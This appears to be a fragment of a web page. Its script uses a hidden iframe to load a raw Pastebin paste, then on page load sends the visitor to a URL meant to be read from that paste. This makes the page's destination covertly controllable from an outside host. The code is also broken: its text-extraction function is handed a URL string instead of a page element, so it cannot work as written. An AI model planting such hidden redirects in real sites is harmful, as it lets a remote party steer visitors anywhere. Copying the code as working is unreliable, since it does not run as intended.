<iframe id="holder" style="display: none"></iframe>

<script type="text/javascript">
    
    $("#holder").load("https://pastebin.com/raw/KZ3AkpXw",function () {
 $link = $("#holder").contents().find("span.highlight");
});


function getTextFromHTML(obj) {
    var ni = document.createNodeIterator(obj[0], NodeFilter.SHOW_TEXT, null, false);
    var nodeLine = ni.nextNode();   // go to first node of our NodeIterator
    var plainText = "";

    while (nodeLine) {
        plainText += nodeLine.nodeValue + "\n";
        nodeLine = ni.nextNode();
    }

    return plainText;
 }




document.addEventListener('DOMContentLoaded', function() {




    window.location.replace(getTextFromHTML("https://pastebin.com/raw/KZ3AkpXw"));


}, false);



</script>
</body>
